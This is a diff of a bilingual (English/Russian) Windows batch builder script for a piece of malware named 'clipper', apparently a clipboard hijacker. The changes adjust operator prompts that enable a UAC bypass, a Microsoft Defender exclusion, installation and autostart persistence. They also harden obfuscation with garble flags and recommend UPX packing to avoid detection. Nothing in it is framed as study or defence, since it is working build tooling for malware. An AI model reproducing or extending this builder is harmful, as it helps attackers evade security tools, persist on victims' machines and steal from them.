@@ -56,19 +56,19 @@ echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
 echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
 echo.
 
-set /p "ENABLE_INSTALL=Enable installation / Включить установку? (y/n): "
-if "!ENABLE_INSTALL!"=="" set "ENABLE_INSTALL=y"
-if /i "!ENABLE_INSTALL!"=="y" (set "INSTALL_FLAG=true") else (set "INSTALL_FLAG=false")
-
 set /p "ENABLE_UAC=Enable UAC bypass / Включить обход UAC? (y/n): "
 if "!ENABLE_UAC!"=="" set "ENABLE_UAC=y"
 if /i "!ENABLE_UAC!"=="y" (set "UAC_FLAG=true") else (set "UAC_FLAG=false")
 
-set /p "ENABLE_DEFENDER=Enable Defender exclusion / Включить исключение из Defender? (y/n): "
+set /p "ENABLE_INSTALL=Enable installation? (recommended) / Включить установку? (рекомендуется) (y/n): "
+if "!ENABLE_INSTALL!"=="" set "ENABLE_INSTALL=y"
+if /i "!ENABLE_INSTALL!"=="y" (set "INSTALL_FLAG=true") else (set "INSTALL_FLAG=false")
+
+set /p "ENABLE_DEFENDER=Enable Defender exclusion? / Включить исключение из Defender? (y/n): "
 if "!ENABLE_DEFENDER!"=="" set "ENABLE_DEFENDER=y"
 if /i "!ENABLE_DEFENDER!"=="y" (set "DEFENDER_FLAG=true") else (set "DEFENDER_FLAG=false")
 
-set /p "ENABLE_AUTOSTART=Enable autostart / Включить автозагрузку? (y/n): "
+set /p "ENABLE_AUTOSTART=Enable autostart? (recommended) / Включить автозагрузку? (рекомендуется) (y/n): "
 if "!ENABLE_AUTOSTART!"=="" set "ENABLE_AUTOSTART=y"
 if /i "!ENABLE_AUTOSTART!"=="y" (set "AUTOSTART_FLAG=true") else (set "AUTOSTART_FLAG=false")
 
@@ -109,12 +109,12 @@ if defined GEO_BLOCK (
 )
 
 
-set /p "OBF=Use hard obfuscation / Использовать сильную обфускацию? (y/n): "
+set /p "OBF=Use hard obfuscation? / Использовать сильную обфускацию? (y/n): "
 
 if /i "%OBF%"=="y" (
-    garble -literals -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
+    garble -tiny -literals -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
 ) else (
-    garble build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
+    garble -tiny -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
 )
 
 if errorlevel 1 (
@@ -135,7 +135,7 @@ echo.
 echo Build successful! / Билд создан: .\clipper.exe
 
 echo.
-set /p "USE_UPX=Use UPX / Использовать UPX для сжатия? (y/n): "
+set /p "USE_UPX=Use UPX? (recommended) / Использовать UPX для сжатия? (рекомендуется) (y/n): "
 
 if /i "!USE_UPX!"=="y" (
     echo.
